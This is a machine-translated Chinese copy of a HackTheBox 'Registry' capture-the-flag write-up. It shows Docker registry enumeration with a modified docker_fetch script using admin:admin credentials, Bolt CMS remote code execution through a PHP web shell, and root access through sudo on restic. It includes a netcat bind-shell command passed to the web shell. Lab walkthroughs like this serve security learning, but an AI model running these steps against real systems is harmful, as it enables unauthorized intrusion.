<html>
<head>
<title>Registry — HackTheBox Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">注册表— HackTheBox编写</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/registry-hackthebox-writeup-98c7822ef51f?source=collection_archive---------0-----------------------#2020-04-04">https://infosecwriteups.com/registry-hackthebox-writeup-98c7822ef51f?source=collection_archive---------0-----------------------#2020-04-04</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="026c" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">Registry本周退役，它是我最喜欢的盒子之一，因为它有独特的概念。我们通过枚举docker registry API获得了最初的立足点，从而找到了SSH凭证。对于Privesc，我们利用restic二进制文件上的sudo权限。</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/a9ae52f257f6cb3d695c5d7ad7691721.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fymb2ZYgJKBTq7iDJLafEQ.png"/></div></div></figure><p id="d532" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们开始吧</p><h1 id="8a79" class="ln lo iq bd lp lq lr ls lt lu lv lw lx jw ly jx lz jz ma ka mb kc mc kd md me bi translated">列举</h1><p id="6cf4" class="pw-post-body-paragraph kr ks iq kt b ku mf jr kw kx mg ju kz la mh lc ld le mi lg lh li mj lk ll lm ij bi mk translated"><span class="l ml mm mn bm mo mp mq mr ms di">像往常一样</span>，让我们从Nmap扫描开始。</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="87e5" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">Nmap scan report for 10.10.10.159<br/>Host is up (0.15s latency).</strong></span><span id="abda" class="my lo iq mu b gy nd na l nb nc"><strong class="mu ir">PORT    STATE SERVICE  VERSION<br/>22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)<br/>|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)<br/>|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)<br/>80/tcp  open  http     nginx 1.14.0 (Ubuntu)<br/>|_http-server-header: nginx/1.14.0 (Ubuntu)<br/>|_http-title: Welcome to nginx!<br/>443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)<br/>|_http-server-header: nginx/1.14.0 (Ubuntu)<br/>|_http-title: Welcome to nginx!<br/>| ssl-cert: Subject: commonName=<em class="ne">docker.registry.htb</em><br/>| Not valid before: 2019-05-06T21:14:35<br/>|_Not valid after:  2029-05-03T21:14:35<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</strong></span></pre><p id="aa31" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们通常打开端口，SSH，HTTP和HTTPS开放。SSL证书公开了一个主机名<code class="fe nf ng nh mu b"><strong class="kt ir"><em class="ne">docker.registry.htb</em></strong></code> <strong class="kt ir"> <em class="ne">。</em> </strong>将其添加到hosts文件中。</p><h1 id="d55b" class="ln lo iq bd lp lq lr ls lt lu lv lw lx jw ly jx lz jz ma ka mb kc mc kd md me bi translated">80 — HTTP</h1><p id="654e" class="pw-post-body-paragraph kr ks iq kt b ku mf jr kw kx mg ju kz la mh lc ld le mi lg lh li mj lk ll lm ij bi translated">访问<a class="ae ni" href="http://10.10.10.159" rel="noopener ugc nofollow" target="_blank"> http://10.10.10.159 </a>向我们展示Nginx默认页面。运行<code class="fe nf ng nh mu b"><strong class="kt ir">gobuster</strong></code>给我们这些结果，</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="9cc3" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">/install (Status: 301)<br/>/bolt (Status: 301)</strong></span></pre><p id="b397" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">手动访问<a class="ae ni" href="http://10.10.10.159/bolt" rel="noopener ugc nofollow" target="_blank">http://10 . 10 . 10 . 159/bolt</a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nj"><img src="../Images/2ecd55ec98738bc87458e0a1a586f5a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*keie8G3OsCoLn_GYJrLJMA.png"/></div></div></figure><p id="4fbd" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><a class="ae ni" href="https://bolt.cm/" rel="noopener ugc nofollow" target="_blank"><strong class="kt ir">https://bolt.cm/</strong></a>是一款开源的内容管理工具。为<code class="fe nf ng nh mu b"><strong class="kt ir">bolt</strong></code> <strong class="kt ir"> </strong>运行searchsploit向我们展示了一个有趣的任意文件上传特性。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nk"><img src="../Images/c87fcd488b2578aeeb41eda3613c60ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iX9oAP5Yp8yDJxB-5odscQ.png"/></div></div></figure><p id="fdfb" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">运行gobuster对抗<a class="ae ni" href="http://10.10.10.159/bolt/" rel="noopener ugc nofollow" target="_blank"><strong class="kt ir">http://10 . 10 . 10 . 159/bolt/</strong></a><strong class="kt ir"/>返回以下结果。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nl"><img src="../Images/f57a7bbce3ab0d7f6c009389f30d7af5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aOqqeNd976hpbOoZyQneLQ.png"/></div></div></figure><p id="2992" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">访问<a class="ae ni" href="http://10.10.10.159/bolt/bolt/" rel="noopener ugc nofollow" target="_blank"><strong class="kt ir">http://10 . 10 . 10 . 159/bolt/bolt/</strong></a><strong class="kt ir"/>返回登录页面。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nm"><img src="../Images/1005efbcaea2a6d3ebd703fa6fc60715.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OzP48lYjpWsXFs-NsW85cQ.png"/></div></div></figure><p id="f457" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">尝试一些默认凭据不起作用。转移到其他东西，直到我们得到证书…</p><h1 id="8527" class="ln lo iq bd lp lq lr ls lt lu lv lw lx jw ly jx lz jz ma ka mb kc mc kd md me bi translated">docker.registry.htb</h1><p id="d7fd" class="pw-post-body-paragraph kr ks iq kt b ku mf jr kw kx mg ju kz la mh lc ld le mi lg lh li mj lk ll lm ij bi translated">访问<a class="ae ni" href="http://docker.registry.htb" rel="noopener ugc nofollow" target="_blank">http://docker . registry . htb</a>将我们带到一个空白页面。运行gobuster会返回一个有趣的端点。</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="dd2a" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">/v2 (Status: 301)</strong></span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nn"><img src="../Images/03333ad646c367c79e0d12541097276c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kNytjnD-9LGfUmW4JNrejQ.png"/></div></div></figure><p id="1eec" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们在回复中看到了一个有趣的标题</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="0010" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">Docker-Distribution-Api-Version registry/2.0</strong></span></pre><p id="79d9" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">谷歌上述标题，我们可以看到Docker注册API文档。<br/><a class="ae ni" href="https://docs.docker.com/registry/spec/api/#listing-repositories" rel="noopener ugc nofollow" target="_blank"><strong class="kt ir">https://docs . docker . com/registry/spec/API/# listing-repositories</strong></a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi no"><img src="../Images/d90e8ffa0ae1ec6932eaec4cb22395c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XNqgK6l1WYpQGqpYiSOlgg.png"/></div></div></figure><p id="4624" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我看到了这篇很棒的文章，它描述了测试Docker注册表的方法。</p><div class="np nq gp gr nr ns"><a href="https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/" rel="noopener  ugc nofollow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">黑客剖析:Docker注册表</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">Docker是一种流行的容器技术，已经被世界各地的行业广泛接受。它被用于…</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">www.notsosecure.com</p></div></div><div class="ob l"><div class="oc l od oe of ob og kp ns"/></div></div></a></div><p id="a145" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们可以完成上面提到的步骤，但这需要很多时间。他们好心地自动完成了整个过程。</p><div class="np nq gp gr nr ns"><a href="https://github.com/NotSoSecure/docker_fetch/" rel="noopener  ugc nofollow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">NotSoSecure/docker_fetch</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">Docker注册表API的数据提取工具。通过创建一个帐户来为NotSoSecure/docker_fetch开发做贡献…</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">github.com</p></div></div><div class="ob l"><div class="oh l od oe of ob og kp ns"/></div></div></a></div><p id="9750" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">这个脚本需要稍微修改，以便添加授权头，因为我们需要向服务器进行身份验证。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oi"><img src="../Images/d98d298503ce54abc2a3ba7dc1fda8d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eNRRJlQ2OSCDSAh-OTAoMA.png"/></div></div></figure><blockquote class="oj ok ol"><p id="f008" class="kr ks ne kt b ku kv jr kw kx ky ju kz om lb lc ld on lf lg lh oo lj lk ll lm ij bi translated">用户:管理员<br/>通行证:管理员</p></blockquote><p id="4bdb" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated"><strong class="kt ir"> <em class="ne">管理:管理</em> </strong>对我们来说很好。我已经为脚本向服务器发出的每个请求添加了授权头。</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="cab7" class="my lo iq mu b gy mz na l nb nc"><strong class="mu ir">import os<br/>import json<br/>import optparse<br/>import requests<br/><br/># pulls Docker Images from unauthenticated docker registry api. <br/># and checks for docker misconfigurations. <br/><br/>apiversion = "v2"<br/>final_list_of_blobs = []<br/><br/> <br/># Disable insecure request warning <br/>from requests.packages.urllib3.exceptions import InsecureRequestWarning<br/>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br/><br/>parser = optparse.OptionParser()<br/>parser.add_option('-u', '--url', action="store", dest="url", help="URL Endpoint for Docker Registry API v2. Eg https://IP:Port", default="spam")<br/>options, args = parser.parse_args()<br/>url = options.url<br/>headers = {"Authorization": "Basic YWRtaW46YWRtaW4=" }<br/><br/><br/>def list_repos():<br/> req = requests.get(url+ "/" + apiversion + "/_catalog", verify=False,headers=headers)<br/>        print req.text<br/> return json.loads(req.text)["repositories"]<br/><br/>def find_tags(reponame):<br/> req = requests.get(url+ "/" + apiversion + "/" + reponame+"/tags/list", verify=False,headers=headers )<br/> print "\n"<br/> data =  json.loads(req.content)<br/> if "tags" in data:<br/>  return data["tags"]<br/><br/><br/>def list_blobs(reponame,tag):<br/> req = requests.get(url+ "/" + apiversion + "/" + reponame+"/manifests/" + tag, verify=False,headers=headers )<br/> data = json.loads(req.content)<br/> if "fsLayers" in data:<br/>  for x in data["fsLayers"]:<br/>   curr_blob = x['blobSum'].split(":")[1]<br/>   if curr_blob not in final_list_of_blobs:<br/>    final_list_of_blobs.append(curr_blob)<br/><br/>def download_blobs(reponame, blobdigest,dirname):<br/> req = requests.get(url+ "/" + apiversion + "/" + reponame +"/blobs/sha256:" + blobdigest, verify=False,headers=headers)<br/> filename = "%s.tar.gz" % blobdigest<br/> with open(dirname + "/" + filename, 'wb') as test:<br/>  test.write(req.content)<br/><br/>def main(): <br/> if url is not "spam":<br/>  list_of_repos = list_repos()<br/>  print "\n[+] List of Repositories:\n"<br/>  for x in list_of_repos:<br/>   print x<br/>  target_repo = raw_input("\nWhich repo would you like to download?:  ")<br/>  if target_repo in list_of_repos:<br/>   tags = find_tags(target_repo)<br/>   if tags is not None:<br/>    print "\n[+] Available Tags:\n"<br/>    for x in tags:<br/>     print x<br/><br/>    target_tag = raw_input("\nWhich tag would you like to download?:  ")<br/>    if target_tag in tags:<br/>     list_blobs(target_repo,target_tag)<br/><br/>     dirname = raw_input("\nGive a directory name:  ")<br/>     os.makedirs(dirname)<br/>     print "Now sit back and relax. I will download all the blobs for you in %s directory. \nOpen the directory, unzip all the files and explore like a Boss. " % dirname<br/>     for x in final_list_of_blobs:<br/>      print "\n[+] Downloading Blob: %s" % x<br/>      download_blobs(target_repo,x,dirname)<br/>    else:<br/>     print "No such Tag Available. Qutting...."<br/>   else:<br/>    print "[+] No Tags Available. Quitting...."<br/>  else:<br/>   print "No such repo found. Quitting...."<br/> else:<br/>  print "\n[-] Please use -u option to define API Endpoint, e.g. https://IP:Port\n"<br/><br/><br/>if __name__ == "__main__":<br/> main()</strong></span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi op"><img src="../Images/73d779fd5587a717ea742614748ba2ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iLQEW-Zz017-W8lAFSmu6g.png"/></div></div></figure><p id="407c" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">这将下载所有的blobs。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oq"><img src="../Images/7e157f42e56a0b24a83e08422d6dea7e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*D4GngumcAfmLtjMwFrErgA.png"/></div></div></figure><p id="acaf" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">让我们使用最大大小的文件。在提取文件时，我们可以看到整个文件系统。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi or"><img src="../Images/146cfb93f7bc3ace26309c87dafb6846.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*if1g8RrM2H51eDTORhN7Ow.png"/></div></div></figure><p id="65b9" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">在枚举目录时，我们获取SSH密钥并通过读取<strong class="kt ir"> <em class="ne">找到用户名。bash_history </em> </strong>文件和一个有趣的SSH脚本。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi os"><img src="../Images/4f9d56d966ee9256b54d554da8ed7c77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4JlsLo6Zu8IIs1ndOOZ-bQ.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ot"><img src="../Images/bac354b55f6a4b66297110cf425e845d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vmyymakMxetXM5oYuoKQRA.png"/></div></div></figure><h1 id="9242" class="ln lo iq bd lp lq lr ls lt lu lv lw lx jw ly jx lz jz ma ka mb kc mc kd md me bi translated">螺栓外壳</h1><p id="7698" class="pw-post-body-paragraph kr ks iq kt b ku mf jr kw kx mg ju kz la mh lc ld le mi lg lh li mj lk ll lm ij bi translated">既然我们已经有了用户名、SSH密钥和密码，现在是登录的时候了。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ou"><img src="../Images/165bf386b3428230e5c4806ece8e1163.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EXFkHq7CWehz2I0j-x8TMQ.png"/></div></div></figure><p id="e1d0" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们发现一个有趣的<code class="fe nf ng nh mu b"><strong class="kt ir">backup.php</strong></code></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ov"><img src="../Images/ac056d0d698c01503c5595b1c7e77af3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vVByA41-F1tV5U7cB2gc5Q.png"/></div></div></figure><p id="eeea" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们可以假设用户<code class="fe nf ng nh mu b"><strong class="kt ir">www-data</strong></code> <strong class="kt ir"> </strong>对<code class="fe nf ng nh mu b"><strong class="kt ir">restic</strong></code> <strong class="kt ir"> </strong>二进制文件拥有sudo权限，因为bolt cms是作为www-data用户运行的。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ow"><img src="../Images/0d5f6919c610253e1aa27d4c15d13872.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iUlbm6Q7okckJPrn6YRO4g.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ox"><img src="../Images/c080df06e49a9504306a20a68d79237b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hPDjBtx2Eb5NH9Kq9QitGg.png"/></div></div></figure><p id="f902" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">让我们来破解哈希</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oy"><img src="../Images/be3270e6be7f109c7eafb991333dfa7f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jSRMK0XBoGQGIGrDMZwHgQ.png"/></div></div></figure><p id="4d38" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">让我们一起来探索博尔特https://fgsec.net/from-csrf-to-rce-bolt-cms/<a class="ae ni" href="https://fgsec.net/from-csrf-to-rce-bolt-cms/" rel="noopener ugc nofollow" target="_blank">RCE</a>。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oz"><img src="../Images/cf86d6c19475b61db93765ac7fa8a45f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tcRe9RsN8X-VioXPnJhIgA.png"/></div></div></figure><p id="48bd" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们可以添加<code class="fe nf ng nh mu b"><strong class="kt ir">php</strong></code> <strong class="kt ir"> </strong>作为接受的文件类型，然后上传一个逆向shell。不幸的是，我们不能直接得到一个反向的shell，可能是出站连接有限制。</p><p id="102c" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我们可以通过下载一个文件到盒子上来证明。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pa"><img src="../Images/d62f6468e71346ea836269b26645eaf2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R32R5QzOyDq0XAYoFPY7ow.png"/></div></div></figure><p id="0471" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">既然得不到反向壳，那就来个绑定壳吧。</p><pre class="kg kh ki kj gt mt mu mv mw aw mx bi"><span id="20ee" class="my lo iq mu b gy mz na l nb nc"><a class="ae ni" href="http://10.10.10.159/bolt/files/simple-backdoor.php?cmd=nc.traditional -lvp 4444 -e /bin/bash" rel="noopener ugc nofollow" target="_blank"><strong class="mu ir">http://10.10.10.159/bolt/files/simple-backdoor.php?cmd=nc.traditional -lvp 4444 -e /bin/bash</strong></a></span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pb"><img src="../Images/33e91bdfbdf5857f971e93942f1f6cb9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oYg_7GplNO_7yGqk2NDRRg.png"/></div></div></figure><h1 id="9394" class="ln lo iq bd lp lq lr ls lt lu lv lw lx jw ly jx lz jz ma ka mb kc mc kd md me bi translated">特权—根</h1><p id="977d" class="pw-post-body-paragraph kr ks iq kt b ku mf jr kw kx mg ju kz la mh lc ld le mi lg lh li mj lk ll lm ij bi translated">正如之前所料，<code class="fe nf ng nh mu b"><strong class="kt ir">www-data</strong></code>拥有对<code class="fe nf ng nh mu b"><strong class="kt ir">restic</strong></code>二进制文件的sudo权限。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pc"><img src="../Images/c45e0157d86478b78fbb1ab35d92b1e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z5RNZoLC4RV6jwGYwi7IFw.png"/></div></div></figure><p id="10ee" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">看<a class="ae ni" href="https://restic.readthedocs.io/en/latest/010_introduction.html" rel="noopener ugc nofollow" target="_blank">文档</a>，我们了解到<code class="fe nf ng nh mu b"><strong class="kt ir">restic is a fast and secure backup information</strong></code> <strong class="kt ir">。</strong></p><p id="757b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">既然我们在<code class="fe nf ng nh mu b"><strong class="kt ir">restic backup</strong></code><strong class="kt ir"/>上拥有sudo特权，那么让我们来看看backup子命令能做什么。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pd"><img src="../Images/69c3d33b67e23104cbe1e1b99ef94714.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H2qR1ZjkeRCE7maKctGcVQ.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pe"><img src="../Images/99b693684ddb3a29cb08055d328aacee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YdZ5J_lKmxS4LatSN5ZPZg.png"/></div></div></figure><blockquote class="oj ok ol"><p id="222a" class="kr ks ne kt b ku kv jr kw kx ky ju kz om lb lc ld on lf lg lh oo lj lk ll lm ij bi translated"><code class="fe nf ng nh mu b"><strong class="kt ir">restic backup</strong></code>命令创建新的快照并保存文件和目录，<code class="fe nf ng nh mu b"><strong class="kt ir">-r</strong></code>代表要备份或从中恢复的存储库。</p></blockquote><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pf"><img src="../Images/ddf41f2c5bac8dcdcb767bfb7e1923cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rMZQlIQPWqaogQkP0OOFHw.png"/></div></div></figure><p id="7b2b" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">我在<code class="fe nf ng nh mu b"><strong class="kt ir">/tmp</strong></code>中创建了一个目录<code class="fe nf ng nh mu b"><strong class="kt ir">abc</strong></code>，然后试着备份那里的<code class="fe nf ng nh mu b"><strong class="kt ir">/root</strong></code>文件夹，但是遇到了一个错误。</p><p id="9c05" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">因此，我们必须创建一个新的存储库。</p><blockquote class="oj ok ol"><p id="d0eb" class="kr ks ne kt b ku kv jr kw kx ky ju kz om lb lc ld on lf lg lh oo lj lk ll lm ij bi translated">保存备份的地方称为“存储库”。存储库可以存储在本地，也可以存储在某个远程服务器或服务上</p></blockquote><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pg"><img src="../Images/bbccb22f6ad3939776af0335cbde7b31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UvjW_reLB-FvG32T32OQOQ.png"/></div></div></figure><p id="2bf5" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">理想情况下，现在我们可以备份到<code class="fe nf ng nh mu b"><strong class="kt ir">/tmp/backup</strong></code>，但是我们可以执行的sudo命令是</p><blockquote class="oj ok ol"><p id="2d95" class="kr ks ne kt b ku kv jr kw kx ky ju kz om lb lc ld on lf lg lh oo lj lk ll lm ij bi translated"><code class="fe nf ng nh mu b"><strong class="kt ir">sudo /usr/bin/restic backup -r rest*</strong></code></p></blockquote><p id="c7fa" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">因此，我创建了一个名为<code class="fe nf ng nh mu b"><strong class="kt ir">rest123</strong></code> <strong class="kt ir"> </strong>的repo，以便与regex <code class="fe nf ng nh mu b"><strong class="kt ir">rest*</strong></code>匹配</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ph"><img src="../Images/5f2882ff1b9fe6be40789a706c940927.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KxQ-MZ36oAowP-K4GKaxSA.png"/></div></div></figure><p id="8c87" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll lm ij bi translated">现在我们已经将根文件夹备份到了<code class="fe nf ng nh mu b"><strong class="kt ir">/tmp/rest123</strong></code> <strong class="kt ir"> </strong>存储库中。让我们恢复回购的数据。按照中提到的步骤</p><div class="np nq gp gr nr ns"><a href="https://restic.readthedocs.io/en/latest/050_restore.html#restoring-from-a-snapshot" rel="noopener  ugc nofollow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">从备份恢复- restic 0.9.6文档</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">使用word恢复上次备份。您还可以结合和筛选器来选择的最后一次备份…</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">restic.readthedocs.io</p></div></div><div class="ob l"><div class="pi l od oe of ob og kp ns"/></div></div></a></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pj"><img src="../Images/898496fbf31647abe1bd6f1b429f3794.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6AoKKdkEuQJvhsoUihH5Ow.png"/></div></div></figure><p id="34bb" class="pw-post-body-paragraph kr ks iq kt b ku kv jr kw kx ky ju kz la lb lc ld le lf lg lh li lj lk ll 